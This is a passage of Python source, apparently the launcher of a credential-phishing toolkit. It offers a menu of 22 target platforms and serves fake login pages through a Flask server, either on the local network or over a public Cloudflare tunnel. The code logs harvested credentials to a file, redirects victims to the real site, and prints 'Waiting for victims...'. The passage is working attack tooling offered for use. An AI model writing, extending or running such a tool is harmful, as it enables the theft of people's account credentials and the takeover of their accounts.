"""

# ─── Main Menu ────────────────────────────────────────────────────────────────
def show_platform_menu():
    print(Fore.CYAN + '\n  ╔══════════════════════════════════════════╗')
    print(Fore.CYAN + '  ║        SELECT TARGET PLATFORM            ║')
    print(Fore.CYAN + '  ╚══════════════════════════════════════════╝\n')
    for k, (name, _, _) in PLATFORMS.items():
        pad = ' ' * (20 - len(name))
        n   = k.rjust(2)
        print(f'  {Fore.WHITE}[{Fore.RED}{n}{Fore.WHITE}]{Style.RESET_ALL}  {name}{pad}', end='')
        if int(k) % 2 == 0:
            print()
    print('\n')

def show_tunnel_menu():
    print(Fore.CYAN + '\n  ╔══════════════════════════════════════════╗')
    print(Fore.CYAN + '  ║        SELECT TUNNEL MODE                ║')
    print(Fore.CYAN + '  ╚══════════════════════════════════════════╝\n')
    print(f'  {Fore.WHITE}[{Fore.RED}1{Fore.WHITE}]{Style.RESET_ALL}  Local Network (LAN/IP)')
    print(f'  {Fore.WHITE}[{Fore.RED}2{Fore.WHITE}]{Style.RESET_ALL}  Cloudflare Tunnel (trycloudflare.com)')
    print()

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)

    # Platform select
    show_platform_menu()
    while True:
        choice = input(Fore.YELLOW + '  [?] Select platform (1-22): ' + Style.RESET_ALL).strip()
        if choice in PLATFORMS:
            break
        print(Fore.RED + '  ✗ Invalid choice. Try again.')

    p_name, p_redir, p_key = PLATFORMS[choice]
    active_platform['name']     = p_key
    active_platform['redirect'] = p_redir

    # Port
    port_in = input(Fore.YELLOW + '  [?] Port (default 8080): ' + Style.RESET_ALL).strip()
    port    = int(port_in) if port_in.isdigit() else 8080

    # Tunnel mode
    show_tunnel_menu()
    while True:
        tmode = input(Fore.YELLOW + '  [?] Tunnel mode (1/2): ' + Style.RESET_ALL).strip()
        if tmode in ('1', '2'):
            break
        print(Fore.RED + '  ✗ Invalid choice.')

    print(Fore.CYAN + f'\n  ► Target Platform : {Fore.WHITE}{p_name}')
    print(Fore.CYAN + f'  ► Port            : {Fore.WHITE}{port}')
    print(Fore.CYAN + f'  ► Redirect After  : {Fore.WHITE}{p_redir}')
    print(Fore.CYAN + f'  ► Credentials Log : {Fore.WHITE}{CREDS_FILE}')

    # Start server in thread
    flask_thread = threading.Thread(
        target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False),
        daemon=True
    )
    flask_thread.start()
    time.sleep(1)

    if tmode == '1':
        lip = get_local_ip()
        print(Fore.GREEN + f'\n  ✓ Server running')
        print(Fore.GREEN + f'  ✓ Local URL  : http://{lip}:{port}')
        print(Fore.GREEN + f'  ✓ Localhost  : http://127.0.0.1:{port}')
    else:
        cf_thread = threading.Thread(target=start_cloudflare, args=(port,), daemon=True)
        cf_thread.start()
        time.sleep(5)
        if cf_url:
            print(Fore.GREEN + f'\n  ✓ Server running')
            print(Fore.GREEN + f'  ✓ Cloudflare : {cf_url}')
        else:
            print(Fore.RED + '  ✗ Cloudflare tunnel failed. Check cloudflared is installed.')

    print(Fore.YELLOW + '\n  ► Waiting for victims... Press Ctrl+C to stop.\n')
    print(Fore.WHITE + '  ' + '─'*50)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + '\n\n  ■ Stopped.')
        if cf_proc:
            cf_proc.terminate()
        print(Fore.YELLOW + f'  Credentials saved to: {CREDS_FILE}\n')

if __name__ == '__main__':
    main()
